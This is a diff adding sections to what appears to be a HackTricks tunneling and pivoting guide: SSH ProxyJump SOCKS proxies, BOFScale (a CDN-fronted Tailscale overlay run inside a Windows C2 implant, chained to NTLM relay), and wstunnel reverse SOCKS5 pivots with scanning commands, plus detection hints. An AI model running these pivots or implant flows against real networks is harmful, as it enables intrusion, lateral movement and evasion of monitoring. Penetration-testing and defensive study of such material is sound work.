@@ -77,6 +77,20 @@ Dynamic (`-D`) forwarding creates a local SOCKS4/SOCKS5 listener whose connectio
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
 
+### Multi-hop with ProxyJump
+
+`-J`/`ProxyJump` connects to the target through one or more comma-separated jump hosts. Forwarding options still belong to the final SSH connection, so the SOCKS listener below opens destinations from `internal-target`, not from the first bastion. This avoids logging into a jump host and starting a second SSH client there.<sup>[[6]](#references)</sup>
+
+```bash
+# Reach the final SSH server through two bastions
+ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target
+
+# Create a local SOCKS proxy whose connections exit from internal-target
+ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
+```
+
+Host-specific options for jump machines should be placed in `~/.ssh/config`; command-line configuration intended for the destination is not automatically applied to intermediate hosts.<sup>[[6]](#references)</sup>
+
 ### Reverse Port Forwarding
 
 This is useful to get reverse shells from internal hosts through a DMZ to your host:
@@ -222,6 +236,46 @@ rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
 ```
 
+## BOFScale - CDN-fronted in-process tailnet
+
+[BOFScale](https://github.com/NetSPI/BOFscale) runs a modified Tailscale overlay inside a Windows C2 implant without installing a TUN driver or service. Its three components are an asynchronous CGo `c-shared` `tailscaled` BOF-PE, a small C++ BOF-PE that speaks the local API, and an asynchronous `socksportfwd` TCP-to-SOCKS5 bridge.<sup>[[53]](#references)[[54]](#references)</sup>
+
+### CDN-compatible TS2021 and DERP
+
+Tailscale normally uses proprietary HTTP upgrades for the Noise-based TS2021 control channel and DERP relay. BOFScale keeps those byte streams but carries them in RFC 6455 WebSockets, using `Sec-WebSocket-Protocol: ts2021` or `derp`, so an operator-controlled Headscale/DERP origin can sit behind a CDN that only accepts standard WebSocket upgrades. The patched client retries TS2021 over WebSockets after HTTP `500`, retries DERP after HTTP `426`, and makes the DERP WebSocket dialer honor the host proxy configuration; the BOF sets `TS_DEBUG_DERP_WS_CLIENT=1` to skip the known-to-fail first attempt.<sup>[[53]](#references)[[54]](#references)</sup>
+
+The CDN and origin proxy must preserve WebSocket upgrades for `/ts2021` and `/derp`, forward `/key` as ordinary HTTP, and disable internal read/write timeouts because relay sessions can remain open indefinitely. The supplied Headscale configuration enables `verify_clients`, publishes only the operator's embedded DERP map, and leaves `derp.urls` empty to prevent fallback to Tailscale-operated relays.<sup>[[53]](#references)[[54]](#references)</sup>
+
+### In-process daemon and named-pipe control
+
+Unless overridden, the BOF entry point starts `tailscaled` with `-tun=userspace-networking`, `-state mem:`, and `-no-logs-no-support`, then creates a UUID-named pipe. It redirects Go stdout/stderr through an OS pipe to the Beacon output API, so the complete daemon and Go runtime remain resident but state and logs are not written to a Tailscale directory.<sup>[[53]](#references)[[54]](#references)</sup>
+
+The lightweight client reproduces Tailscale's HTTP/1.0 local API over that pipe. It opens the pipe with `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` because the daemon's `safesocket` layer impersonates the pipe client, sends `Tailscale-Cap: 125`, and maps the local API to `up`, `down`, `status`, route advertisement, and shutdown operations.<sup>[[53]](#references)[[54]](#references)</sup>
+
+> [!WARNING]
+> Do not unload a manually mapped Go BOF-PE after asking the daemon to shut down: runtime and garbage-collector goroutines can continue executing from memory that the loader unmaps. Run `tailscaled` in a sacrificial process and terminate that process for final cleanup.<sup>[[54]](#references)</sup>
+
+### Bridge host-originated traffic through userspace SOCKS5
+
+Inbound tailnet connections and advertised subnet routes work inside the userspace network stack, but normal processes on the compromised host have no OS route into the overlay. `socksportfwd` therefore listens on a victim-facing TCP port, negotiates SOCKS5 `NO AUTH` with the daemon's `0.0.0.0:1080` listener, issues `CONNECT` for a tailnet destination, and relays both directions asynchronously. When the target is a MagicDNS name it uses `ATYP_DOMAIN`, making `tailscaled` resolve the name without exposing it to the Windows resolver.<sup>[[53]](#references)[[54]](#references)</sup>
+
+A minimal operator flow is shown below; both the operator node and implant must use the patched binaries because stock Tailscale cannot traverse this CDN design.<sup>[[53]](#references)[[54]](#references)</sup>
+
+```bash
+HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
+# Start tailscaled as an asynchronous BOF and copy its printed pipe name
+tailscaled
+tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
+tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
+socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
+```
+
+The local forward can separate the apparent authentication listener from the relay tool: coerce a machine to authenticate to the compromised host's bound port, forward it through the tailnet to `ntlmrelayx`, and relay onward to AD CS, LDAP, HTTP, SMB, or another compatible target. See [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) and [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) for the vulnerability-specific stages; BOFScale is only the transport.<sup>[[54]](#references)</sup>
+
+### Detection
+
+Hunt for the combination rather than a single weak indicator: a Go runtime in a process that is not normally Go-based, a UUID pipe with permissive SDDL `D:(A;;GA;;;WD)`, an unexpected `0.0.0.0:1080` SOCKS listener, and long-lived TLS WebSockets to CDN addresses. With TLS inspection, flag `Sec-WebSocket-Protocol: derp` or `ts2021` when the owning process is not an authorized `tailscaled` service. The repository's `bofscale.yar` rules provide memory signatures for all three BOF-PE components.<sup>[[53]](#references)[[54]](#references)</sup>
+
 ## reGeorg
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
@@ -254,6 +308,42 @@ Chisel carries TCP/UDP traffic over HTTP using an SSH-protected connection; use 
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
 ```
+
+## wstunnel
+
+[`wstunnel`](https://github.com/erebe/wstunnel) carries static or dynamic forwards over WebSocket, HTTP/2, or WebTransport (HTTP/3 over QUIC). Current builds support TCP, UDP, Unix sockets, stdio, SOCKS5, HTTP proxying, and Linux transparent-proxy listeners in both forward and reverse modes.<sup>[[52]](#references)</sup>
+
+### Reverse SOCKS5 pivot
+
+Run the server on the attacker and make the pivot connect outbound with `-R`. In this direction the SOCKS5 listener is created on the **server** while requested connections originate from the **client/pivot** network.<sup>[[52]](#references)</sup>
+
+```bash
+# Attacker: use a certificate valid for pivot.example
+wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443
+
+# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
+wstunnel client --tls-verify-certificate \
+  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443
+
+# Attacker
+proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
+```
+
+A reverse static forward uses the same direction. For example, the following exposes `10.10.10.20:445`, as reached by the pivot, on attacker loopback port `8445`:<sup>[[52]](#references)</sup>
+
+```bash
+wstunnel client --tls-verify-certificate \
+  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
+```
+
+### Egress and transport details
+
+- Add `-p http://user:pass@proxy:8080` to the client to cross an explicit HTTP proxy. Use `socks5h://127.0.0.1:1080` in clients such as `curl` (or enable proxied DNS in the application) so internal names are resolved beyond the tunnel rather than leaked to the local resolver.<sup>[[52]](#references)</sup>
+- `wss://` selects TLS-protected WebSocket. An `https://` client selects HTTP/2, but buffering or HTTP/1 conversion by reverse proxies/CDNs commonly breaks the bidirectional stream; expose the wstunnel server directly when testing this mode.<sup>[[52]](#references)</sup>
+- `wts://` selects WebTransport over QUIC. Start the server with `--enable-webtransport` (or a `wts://` listen URL) and allow UDP on the listening port. This mode cannot traverse a conventional HTTP `CONNECT` proxy because that proxy carries TCP.<sup>[[52]](#references)</sup>
+
+> [!WARNING]
+> The upstream project warns not to treat its embedded self-signed certificate as privacy protection. Prefer a valid custom certificate plus `--tls-verify-certificate` (or mTLS), keep proxy listeners on loopback unless remote access is intentional, and tunnel already-secure protocols when confidentiality matters.<sup>[[52]](#references)</sup>
 
 ## Ligolo-ng
 
@@ -937,5 +1027,8 @@ The same report details the defaults, wildcard listeners, packet decryption, rel
 - [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
 - [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
 - [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
+- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
+- [53] [NetSPI BOFScale source repository](https://github.com/NetSPI/BOFscale)
+- [54] [BOFScale: A CDN-Fronted Tailnet from a BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
 
 {{#include ../banners/hacktricks-training.md}}
